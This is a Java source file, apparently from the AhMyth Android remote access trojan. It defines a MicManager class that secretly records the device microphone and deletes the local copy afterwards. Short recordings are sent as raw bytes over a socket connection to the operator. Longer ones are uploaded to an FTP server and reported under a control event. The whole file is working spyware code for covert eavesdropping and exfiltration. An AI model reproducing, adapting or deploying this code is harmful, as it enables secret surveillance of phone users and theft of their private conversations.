package ahmyth.mine.king.ahmyth;


        import android.media.MediaRecorder;
        import android.util.Log;
        import org.json.JSONException;
        import org.json.JSONObject;
        import java.io.BufferedInputStream;
        import java.io.File;
        import java.io.FileInputStream;
        import java.io.FileNotFoundException;
        import java.io.IOException;
        import java.util.Timer;
        import java.util.TimerTask;

/**
 * Created by AhMyth on 11/11/16.
 */

public  class MicManager {


    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    static TimerTask stopRecording;


    public static void startRecording(int sec) throws Exception {


        //Creating file
        File dir = MainService.getContextOfApplication().getCacheDir();
        try {
            Log.e("DIRR" , dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return;
        }


        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        recorder.prepare();
        recorder.start();


        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.release();
                if(sec<15)
                {
                    sendVoice(audiofile);
                    audiofile.delete();
                }else if (sec>=15)
                {
                    ftpUpload(audiofile.getAbsolutePath());
                }
                //ftpUpload(audiofile.getAbsolutePath());
                //sendVoice(audiofile);
                //audiofile.delete();
            }
        };

        new Timer().schedule(stopRecording, sec*1000);
    }
    private static void ftpUpload(String file) {
        new Thread() {
            public void run() {
                try {
                    System.out.println("正在连接ftp服务器....");
                    FTPManager ftpManager = new FTPManager();
                    if (ftpManager.connect()) {
                        if (ftpManager.uploadFile(file, "")) {
                            ftpManager.closeFTP();
                        }
                    }
                    final File filea = new File(file);
                    JSONObject object = new JSONObject();
                    object.put("file",true);
                    object.put("name",filea.getName());
                    IOSocket.getInstance().getIoSocket().emit("x0000mc" , object);
                    Log.d("Ahmyth","file.getName()x0000mc "+filea.getName());
                    filea.delete();
                } catch (Exception e) {
                    // TODO: handle exception
                    // System.out.println(e.getMessage());
                }
            }
        }.start();
    }
    private static void sendVoice(File file){

        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file",true);
            object.put("show",true);
            object.put("name",file.getName());
            object.put("buffer" , data);
            IOSocket.getInstance().getIoSocket().emit("x0000mc" , object);
            buf.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

}

